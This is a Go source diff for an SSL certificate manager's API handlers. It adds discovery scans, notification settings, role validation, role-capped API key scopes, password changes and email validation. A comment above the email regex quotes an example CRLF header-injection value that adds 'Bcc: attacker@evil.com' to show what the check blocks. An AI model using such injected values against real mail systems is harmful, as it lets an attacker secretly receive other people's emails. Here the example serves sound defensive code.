@@ -2,14 +2,20 @@ package api
 
 import (
 	"encoding/json"
+	"fmt"
 	"net/http"
+	"regexp"
+	"slices"
 	"strconv"
+	"time"
 
 	"github.com/yilmazerhan/ssl-manager/backend/internal/audit"
 	"github.com/yilmazerhan/ssl-manager/backend/internal/auth"
 	"github.com/yilmazerhan/ssl-manager/backend/internal/certificate"
+	"github.com/yilmazerhan/ssl-manager/backend/internal/discovery"
 	"github.com/yilmazerhan/ssl-manager/backend/internal/downloadtoken"
 	"github.com/yilmazerhan/ssl-manager/backend/internal/order"
+	"github.com/yilmazerhan/ssl-manager/backend/internal/renewal"
 	"github.com/yilmazerhan/ssl-manager/backend/internal/user"
 )
 
@@ -246,6 +252,193 @@ func (h *handlers) validateOrder(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, http.StatusOK, o.Public())
 }
 
+func (h *handlers) createDiscoveryScan(w http.ResponseWriter, r *http.Request) {
+	identity, _ := auth.IdentityFromContext(r.Context())
+
+	var req discovery.CreateScanRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	sc, err := h.deps.Discovery.CreateScan(r.Context(), req, identity.UserID)
+	if err != nil {
+		writeError(w, http.StatusBadRequest, err.Error())
+		return
+	}
+	h.audit(r, "discovery_scan_started", "discovery_scan", sc.ID, string(auth.ScopeCertsAdmin), map[string]interface{}{
+		"targets": req.Targets, "ports": sc.Ports, "total_targets": sc.TotalTargets,
+	})
+	writeJSON(w, http.StatusCreated, sc)
+}
+
+func (h *handlers) listDiscoveryScans(w http.ResponseWriter, r *http.Request) {
+	scans, err := h.deps.Discovery.ListScans(r.Context())
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not list scans")
+		return
+	}
+	writeJSON(w, http.StatusOK, scans)
+}
+
+func (h *handlers) getDiscoveryScan(w http.ResponseWriter, r *http.Request) {
+	sc, err := h.deps.Discovery.GetScan(r.Context(), r.PathValue("id"))
+	if err != nil {
+		writeError(w, http.StatusNotFound, "scan not found")
+		return
+	}
+	writeJSON(w, http.StatusOK, sc)
+}
+
+func (h *handlers) listDiscoveryResults(w http.ResponseWriter, r *http.Request) {
+	results, err := h.deps.Discovery.ListResults(r.Context(), r.PathValue("id"))
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not list scan results")
+		return
+	}
+	writeJSON(w, http.StatusOK, results)
+}
+
+func (h *handlers) cancelDiscoveryScan(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	if err := h.deps.Discovery.CancelScan(r.Context(), id); err != nil {
+		writeError(w, http.StatusConflict, err.Error())
+		return
+	}
+	h.audit(r, "discovery_scan_canceled", "discovery_scan", id, string(auth.ScopeCertsAdmin), nil)
+	writeJSON(w, http.StatusOK, map[string]string{"status": "canceling"})
+}
+
+func (h *handlers) getNotificationSettings(w http.ResponseWriter, r *http.Request) {
+	settings, err := h.deps.NotificationSettings.Get(r.Context())
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not load notification settings")
+		return
+	}
+	writeJSON(w, http.StatusOK, settings)
+}
+
+func (h *handlers) updateNotificationSettings(w http.ResponseWriter, r *http.Request) {
+	var req renewal.ReminderSettings
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+	if len(req.ThresholdDays) == 0 {
+		writeError(w, http.StatusBadRequest, "at least one threshold day is required")
+		return
+	}
+	if err := validateEmails(req.DefaultRecipients); err != nil {
+		writeError(w, http.StatusBadRequest, "default_recipients: "+err.Error())
+		return
+	}
+	if err := validateEmails(req.EscalationRecipients); err != nil {
+		writeError(w, http.StatusBadRequest, "escalation_recipients: "+err.Error())
+		return
+	}
+	if err := renewal.ValidateTemplates(req.EmailSubjectTemplate, req.EmailBodyTemplate); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid template: "+err.Error())
+		return
+	}
+	if err := h.deps.NotificationSettings.Update(r.Context(), req); err != nil {
+		writeError(w, http.StatusInternalServerError, "could not update notification settings")
+		return
+	}
+	h.audit(r, "notification_settings_updated", "notification_settings", "1", string(auth.ScopeCertsAdmin), nil)
+	writeJSON(w, http.StatusOK, req)
+}
+
+func (h *handlers) listRecentNotifications(w http.ResponseWriter, r *http.Request) {
+	limit := 100
+	if v := r.URL.Query().Get("limit"); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n > 0 {
+			limit = n
+		}
+	}
+	entries, err := h.deps.NotifyLog.Recent(r.Context(), limit)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not list notifications")
+		return
+	}
+	writeJSON(w, http.StatusOK, entries)
+}
+
+func (h *handlers) certificateNotifications(w http.ResponseWriter, r *http.Request) {
+	cert, ok := h.loadCertificateForTeam(w, r)
+	if !ok {
+		return
+	}
+	entries, err := h.deps.NotifyLog.ForCertificate(r.Context(), cert.ID)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not list notifications for this certificate")
+		return
+	}
+	writeJSON(w, http.StatusOK, entries)
+}
+
+func (h *handlers) updateCertificateNotifyEmails(w http.ResponseWriter, r *http.Request) {
+	cert, ok := h.loadCertificateForTeam(w, r)
+	if !ok {
+		return
+	}
+	var req struct {
+		Emails []string `json:"emails"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+	if err := validateEmails(req.Emails); err != nil {
+		writeError(w, http.StatusBadRequest, err.Error())
+		return
+	}
+	if err := h.deps.Certs.UpdateNotifyEmails(r.Context(), cert.ID, req.Emails); err != nil {
+		writeError(w, http.StatusInternalServerError, "could not update notification emails")
+		return
+	}
+	h.audit(r, "notify_emails_updated", "certificate", cert.ID, string(auth.ScopeCertsIssue), map[string]interface{}{"emails": req.Emails})
+	writeJSON(w, http.StatusOK, map[string]string{"status": "updated"})
+}
+
+// summaryReport is the dashboard/reports payload. Discovery and
+// notification breakdowns are admin-only concerns (the same scope that
+// gates the Discovery and Notifications pages themselves), so they're left
+// nil for a team-scoped viewer rather than leaking cross-team activity.
+type summaryReport struct {
+	Certificates           certificate.Stats  `json:"certificates"`
+	DiscoveryMismatches    []discovery.Result `json:"discovery_mismatches,omitempty"`
+	NotificationsSent30d   int                `json:"notifications_sent_30d,omitempty"`
+	NotificationsFailed30d int                `json:"notifications_failed_30d,omitempty"`
+}
+
+func (h *handlers) getSummaryReport(w http.ResponseWriter, r *http.Request) {
+	identity, _ := auth.IdentityFromContext(r.Context())
+
+	team := identity.Team
+	if identity.Role == user.RoleAdmin || identity.Role == user.RoleAPIOnly {
+		team = ""
+	}
+
+	stats, err := h.deps.Certs.Stats(r.Context(), team)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not load certificate statistics")
+		return
+	}
+	report := summaryReport{Certificates: stats}
+
+	if team == "" {
+		if mismatches, err := h.deps.Discovery.ListMismatches(r.Context(), 50); err == nil {
+			report.DiscoveryMismatches = mismatches
+		}
+		if sent, failed, err := h.deps.NotifyLog.Stats(r.Context(), time.Now().Add(-30*24*time.Hour)); err == nil {
+			report.NotificationsSent30d = sent
+			report.NotificationsFailed30d = failed
+		}
+	}
+
+	writeJSON(w, http.StatusOK, report)
+}
+
 func (h *handlers) listUsers(w http.ResponseWriter, r *http.Request) {
 	users, err := h.deps.Users.List(r.Context())
 	if err != nil {
@@ -253,6 +446,10 @@ func (h *handlers) listUsers(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	writeJSON(w, http.StatusOK, users)
+}
+
+var validRoles = map[user.Role]bool{
+	user.RoleViewer: true, user.RoleCertManager: true, user.RoleAdmin: true, user.RoleAPIOnly: true,
 }
 
 func (h *handlers) setUserRole(w http.ResponseWriter, r *http.Request) {
@@ -264,6 +461,10 @@ func (h *handlers) setUserRole(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusBadRequest, "invalid request body")
 		return
 	}
+	if !validRoles[req.Role] {
+		writeError(w, http.StatusBadRequest, "unknown role")
+		return
+	}
 	id := r.PathValue("id")
 	if err := h.deps.Users.SetRoleAndTeam(r.Context(), id, req.Role, req.Team); err != nil {
 		writeError(w, http.StatusInternalServerError, "could not update user")
@@ -273,6 +474,12 @@ func (h *handlers) setUserRole(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, http.StatusOK, map[string]string{"status": "updated"})
 }
 
+// createAPIKey never grants a scope beyond what the target user's own role
+// already earns — otherwise a key holder whose scopes happen to exceed
+// their role (e.g. an over-provisioned earlier key) could mint themselves a
+// fresh, durable key at the wider scope and outlive any correction to the
+// original mismatch. Role, not scope, is the source of truth for how much
+// a user is allowed to grant.
 func (h *handlers) createAPIKey(w http.ResponseWriter, r *http.Request) {
 	var req struct {
 		Name   string   `json:"name"`
@@ -284,6 +491,26 @@ func (h *handlers) createAPIKey(w http.ResponseWriter, r *http.Request) {
 	}
 	id := r.PathValue("id")
 
+	target, err := h.deps.Users.GetByID(r.Context(), id)
+	if err != nil {
+		writeError(w, http.StatusNotFound, "user not found")
+		return
+	}
+	// api_only is the deliberate exception: its whole purpose is a service
+	// account whose permissions are entirely defined by the keys minted for
+	// it rather than a fixed role->scope mapping (RoleScopes returns nil for
+	// it), so any of the four known scopes is legitimate there.
+	allowed := auth.RoleScopes(target.Role)
+	if target.Role == user.RoleAPIOnly {
+		allowed = []string{string(auth.ScopeCertsRead), string(auth.ScopeCertsExport), string(auth.ScopeCertsIssue), string(auth.ScopeCertsAdmin)}
+	}
+	for _, s := range req.Scopes {
+		if !slices.Contains(allowed, s) {
+			writeError(w, http.StatusBadRequest, "scope "+s+" exceeds what this user's role permits")
+			return
+		}
+	}
+
 	raw, err := h.deps.APIKeys.Create(r.Context(), id, req.Name, req.Scopes)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "could not create API key")
@@ -291,6 +518,67 @@ func (h *handlers) createAPIKey(w http.ResponseWriter, r *http.Request) {
 	}
 	h.audit(r, "api_key_created", "user", id, string(auth.ScopeCertsAdmin), map[string]interface{}{"name": req.Name, "scopes": req.Scopes})
 	writeJSON(w, http.StatusCreated, map[string]string{"key": raw})
+}
+
+// changePassword lets the currently authenticated identity replace its
+// own local password. It's the one endpoint reachable while
+// MustChangePassword is still set (see router.go's authedOnly vs authed),
+// since it's exactly what clears that flag. It reissues a fresh session
+// token so the client's decoded must_change_password claim goes stale
+// immediately, rather than the browser needing to log in again for that
+// to take effect.
+func (h *handlers) changePassword(w http.ResponseWriter, r *http.Request) {
+	identity, _ := auth.IdentityFromContext(r.Context())
+
+	var req struct {
+		CurrentPassword string `json:"current_password"`
+		NewPassword     string `json:"new_password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	u, err := h.deps.Users.GetByID(r.Context(), identity.UserID)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not load account")
+		return
+	}
+	if u.PasswordHash == "" {
+		writeError(w, http.StatusBadRequest, "this account has no local password to change — it signs in via SSO")
+		return
+	}
+	if !auth.VerifyPassword(u.PasswordHash, req.CurrentPassword) {
+		writeError(w, http.StatusUnauthorized, "current password is incorrect")
+		return
+	}
+	if err := auth.ValidatePassword(req.NewPassword); err != nil {
+		writeError(w, http.StatusBadRequest, err.Error())
+		return
+	}
+	if req.NewPassword == req.CurrentPassword {
+		writeError(w, http.StatusBadRequest, "new password must be different from the current password")
+		return
+	}
+
+	hash, err := auth.HashPassword(req.NewPassword)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "could not set new password")
+		return
+	}
+	if err := h.deps.Users.SetPassword(r.Context(), u.ID, hash, false); err != nil {
+		writeError(w, http.StatusInternalServerError, "could not set new password")
+		return
+	}
+	u.PasswordHash, u.MustChangePassword = hash, false
+
+	token, err := h.deps.Sessions.Issue(u)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "password changed, but could not issue a new session — please log in again")
+		return
+	}
+	h.audit(r, "password_changed", "user", u.ID, "", nil)
+	writeJSON(w, http.StatusOK, map[string]string{"status": "updated", "token": token})
 }
 
 // loadCertificateForTeam fetches the path {id} certificate and enforces
@@ -326,4 +614,21 @@ func writeJSON(w http.ResponseWriter, status int, v any) {
 
 func writeError(w http.ResponseWriter, status int, message string) {
 	writeJSON(w, status, map[string]string{"error": message})
+}
+
+// emailPattern is deliberately permissive about what counts as an email
+// address — its job isn't RFC 5322 validation, it's rejecting whitespace
+// and control characters (CR/LF above all) before a value that's headed
+// for a raw SMTP "To:"/"Bcc:" header line ever gets there. A crafted
+// recipient containing "\r\nBcc: attacker@evil.com" would otherwise inject
+// an extra header into every reminder email sent for that certificate.
+var emailPattern = regexp.MustCompile(`^[^\s@]+@[^\s@]+\.[^\s@]+$`)
+
+func validateEmails(emails []string) error {
+	for _, e := range emails {
+		if !emailPattern.MatchString(e) {
+			return fmt.Errorf("invalid email address %q", e)
+		}
+	}
+	return nil
 }
